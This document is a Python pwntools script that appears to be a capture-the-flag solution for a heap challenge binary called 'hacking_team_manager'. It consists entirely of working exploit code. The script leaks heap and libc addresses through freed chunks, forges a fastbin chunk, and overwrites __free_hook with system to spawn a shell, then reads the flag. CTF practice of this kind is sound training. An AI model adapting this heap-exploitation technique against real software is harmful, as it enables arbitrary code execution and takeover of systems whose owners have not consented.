from pwn import *

s = process('./hacking_team_manager')
e = ELF('./hacking_team_manager')

def to_main():
	s.recvuntil('> ')

def register(nickname, teamname):
	s.recvuntil('What is your nick name? ')
	s.sendline(nickname)
	s.recvuntil('What is your team name? ')
	s.sendline(teamname)
	to_main()

def hire(nickname):
	s.sendline('1')
	s.recvuntil('Do you want to hire another hacker? ')
	s.sendline('yes')
	s.recvuntil('What is your nick name? ')
	s.sendline(nickname)
	to_main()

def living_hell(mem_no):
	s.sendline('2')
	s.recvuntil('> ')
	s.sendline('2')
	s.recvuntil('> ')
	s.sendline(mem_no)
	s.recvuntil('> ')
	s.sendline('3')
	to_main()

def dup(target, vul):
	s.sendline('1')
	s.recvuntil('What\'s the target? ')
	s.sendline(target)
	s.recvline()
	s.sendline(vul)
	result = s.recvuntil('> ')
	if 'duplicated' in result:
		dup(target, vul)

def start_working(your_work, option, target='0', vul='0', new_detail='0', price='0', team_name='0'):
	leaked = 0
	s.sendline('2')
	s.recvuntil('> ')
	s.sendline(your_work)
	if your_work == '2':
		s.recvuntil('> ')
		s.sendline(team_name)
	s.recvuntil('> ')
	s.sendline(option)
	if option == '1': # finding_vulnerability
		s.recvuntil('What\'s the target? ')
		s.sendline(target) # Browser, Kernel, MobileOS
		s.recvline()
		s.sendline(vul)
		if 'new' in vul:
			s.recvline()
			s.sendline(new_detail)
			s.recvuntil('How much you think? ')
			s.sendline(price)
			s.recvuntil('> ')
		else:
			result = s.recvuntil('> ')
			if 'duplicated' in result:
				dup(target, vul)
	elif option == '2': # outsourcing
		s.recvuntil('> ')
	elif option == '3': # edit vulnerability list
		s.recvuntil('> ')
		s.sendline(target)
		answer = s.recv()
		if 'no vulnerability' in answer:
			s.sendline('5')
			s.recvuntil('> ')
		else: #Do you want to edit it or delete it?
			s.sendline(vul) # edit or delete
			if 'edit' in vul:
				s.recvuntil('> ')
				s.sendline(new_detail)
				s.recvuntil(': ')
				s.sendline(price)
			elif 'delete' in vul:
				s.recvuntil('> ')
	elif option == '4': # show vulnerability list
		s.recvuntil('Prize : ')
		s.recvuntil('Prize : ')
		if team_name == '1':
			leaked = int(s.recv(15))
		else:
			leaked = int(s.recv(14))
		s.recv()
	s.sendline('5')
	s.recvuntil('> ')
	s.sendline('3')
	s.recvuntil('> ')
	return leaked

def exploit():
	s.sendline('2')
	s.recvuntil('> ')
	s.sendline('2')
	s.recvuntil('> ')
	s.sendline('1')
	s.recv()
	s.recvline()

register('ABCDEFGH', 'IJKLMNOP')
start_working('1', '1', 'MobileOS', 'Leak')
start_working('1', '1', 'MobileOS', 'Leak')
start_working('1', '1', 'MobileOS', 'Leak')

start_working('1', '3', '1', 'delete') 
start_working('1', '3', '0', 'delete') 

heap_leak = start_working('1', '4') # fastbin free -> fd

hire('1')
hire('2')
hire('3')
hire('4')

start_working('2', '1', 'Kernel', 'Overflow', '0', '0', '1')
start_working('2', '1', 'Kernel', 'Overflow', '0', '0', '1')
start_working('2', '1', 'Kernel', 'Overflow', '0', '0', '1')
start_working('2', '1', 'Kernel', 'Overflow', '0', '0', '1')

start_working('2', '3', '0', 'edit', '3', 'a'*90, '1') # resize price 
start_working('2', '3', '1', 'edit', '3', 'a'*90, '1')

start_working('2', '3', '0', 'delete', '0', '0', '1')
start_working('2', '3', '1', 'delete', '0', '0', '1')

arena_leak = start_working('2', '4', '0', '0', '0', '0', '1')
libc_leak = arena_leak - 0x3c4b78
system = libc_leak + 0x45390
free_hook = libc_leak + 0x3c67a8
fake_chunk = heap_leak - 0x10

start_working('2', '2', '0', '0', '0', '0', '2') # outsourcing
start_working('2', '2', '0', '0', '0', '0', '2')
start_working('2', '2', '0', '0', '0', '0', '2')
start_working('2', '2', '0', '0', '0', '0', '2')
start_working('2', '2', '0', '0', '0', '0', '2')
start_working('2', '2', '0', '0', '0', '0', '2')

start_working('1', '1', 'Kernel', 'Overflow')
start_working('1', '1', 'Kernel', 'Overflow')
start_working('1', '1', 'Kernel', 'Overflow')
start_working('1', '1', 'Kernel', 'Overflow')
start_working('1', '1', 'Kernel', 'Overflow')

start_working('1', '3', '4', 'delete')
start_working('1', '3', '4', 'edit', '2', str(int(fake_chunk))) 
start_working('1', '3', '0', 'edit', '3', p64(0x50)) # fake chunk size ( vul ) 

start_working('1', '1', 'MobileOS', 'Leak')
start_working('1', '1', 'MobileOS', 'Leak') # fake_chunk
start_working('1', '3', '8', 'edit', '1', p64(free_hook)) 
start_working('1', '3', '1', 'edit', '1', p64(system)) # free_hook -> system
start_working('1', '3', '8', 'edit', '1', p64(free_hook+16)) 
start_working('1', '3', '1', 'edit', '1', '/bin/sh;') # system(/bin/sh;)

exploit()
s.sendline('id')
s.sendline('cat flag')
s.interactive()

